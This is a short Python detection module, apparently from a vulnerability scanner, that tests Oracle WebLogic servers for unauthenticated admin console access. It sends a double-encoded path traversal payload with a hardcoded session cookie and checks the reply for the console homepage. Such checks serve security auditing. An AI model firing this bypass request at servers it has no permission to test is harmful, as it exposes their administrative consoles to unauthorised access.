# -*- coding:utf-8 -*-
# weblogic_控制台未授权

from .. import requestUtil
from ServiceScanModel.models import ServiceScan

def fingerprint(service):
    try:
        if service.url:
            resp = requestUtil.get(service.url+"/console")
            if resp.status_code == 200:
                return True
    except:
        return False

def poc(service: ServiceScan):
    try:
        resp = requestUtil.get(service.url+"/console/css/%252e%252e%252fconsole.portal", cookies="ADMINCONSOLESESSION=kzJbgq1R262PK2BDhyXyRLvYb534FM2RCPbzv05nDpwk3tGWxGcR!-1057352602")
        if "控制台主页" in resp.text:
            return ["weblogic_控制台未授权", "/console/css/%252e%252e%252fconsole.portal"]
    except:
        return []